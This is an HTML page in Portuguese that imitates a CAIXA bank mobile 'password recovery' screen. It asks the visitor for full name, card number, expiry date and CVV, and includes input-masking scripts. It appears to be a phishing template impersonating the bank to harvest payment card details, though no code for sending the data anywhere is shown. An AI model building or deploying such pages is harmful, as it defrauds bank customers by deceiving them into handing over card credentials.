<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recuperação - CAIXA</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
        body { display: flex; justify-content: center; background-color: #f0f0f0; }
        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; }

        /* Cabeçalho */
        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 40px; }
        .logo img { height: 35px; }

        /* Inputs */
        .input-group { position: relative; margin-bottom: 20px; }
        .input-group input { width: 100%; padding: 18px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; outline: none; }
        
        /* Layout lado a lado */
        .row-group { display: flex; gap: 10px; }
        .half { width: 50%; }

        h1 { margin-bottom: 20px; font-size: 24px; color: #1d2124; }
        .btn-confirmar { width: 100%; padding: 15px; background-color: #F39200; color: white; border: none; border-radius: 24px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="mobile-container">
        <header class="header">
            <div class="logo"><img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="logo"></div>
            <a href="index.html" style="color:#005ca9; text-decoration:none;">Sair</a>
        </header>

        <h1>Recuperação de senha</h1>

        <div class="input-group">
            <input type="text" placeholder="Nome Completo">
        </div>
        <div class="input-group">
            <input type="text" placeholder="Número do cartão" maxlength="16">
        </div>

        <div class="row-group">
            <div class="input-group half">
                <input type="text" id="data" placeholder="MM/AA" maxlength="5">
            </div>
            <div class="input-group half">
                <!-- Alterado o ID para CVV para bater com o script -->
                <input type="text" id="CVV" placeholder="000" maxlength="3">
            </div>
        </div>

        <button class="btn-confirmar">Continuar</button>
    </div>

    <script>
        // Máscara para Data (MM/AA)
        document.getElementById('data').addEventListener('input', function(e) {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
            e.target.value = v;
        });

        // Máscara para apenas números (3 dígitos) no campo CVV
        document.getElementById('CVV').addEventListener('input', function(e) {
            // Remove qualquer coisa que não seja número
            e.target.value = e.target.value.replace(/\D/g, '');
            // Garante que não passe de 3 dígitos (além do maxlength)
            if (e.target.value.length > 3) {
                e.target.value = e.target.value.substring(0, 3);
            }
        });
    </script>
</body>
</html>
